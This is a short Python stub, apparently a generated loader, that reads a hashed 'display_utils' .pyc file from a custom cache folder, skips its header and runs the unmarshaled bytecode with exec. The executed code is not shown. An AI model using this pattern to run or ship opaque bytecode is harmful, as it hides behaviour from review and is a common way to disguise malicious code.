
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'display_utils_52d4ca98bf714d23a088bab0154ee38d.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
